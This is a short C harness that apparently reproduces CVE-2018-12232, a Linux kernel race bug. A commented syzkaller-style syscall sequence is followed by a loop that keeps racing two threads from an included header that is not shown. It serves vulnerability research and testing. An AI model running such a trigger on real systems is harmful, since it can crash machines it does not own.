/*
socketpair$unix(0x1, 0x1, 0x0,
&(0x7f0000000000)={<r0=>0xffffffffffffffff, <r1=>0xffffffffffffffff})
getresuid(&(0x7f0000000080)=<r2=>0x0, &(0x7f00000000c0),
&(0x7f0000000700))r3 = getegid()
fchownat(r0, &(0x7f0000000040)='\x00', r2, r3, 0x1000)
dup3(r1, r0, 0x80000)
*/

#define _GNU_SOURCE

#include <pthread.h>

#include "../cves/cve-2018-12232.h"

int main(int argc, char *argv[]) {
  pthread_t pth[2];
  while (1) {
    cve_2018_12232_init();

    pthread_create(&pth[0], NULL, cve_2018_12232_th1, NULL);
    pthread_create(&pth[1], NULL, cve_2018_12232_th2, NULL);

    pthread_join(pth[0], NULL);
    pthread_join(pth[1], NULL);
  }
  return 0;
}
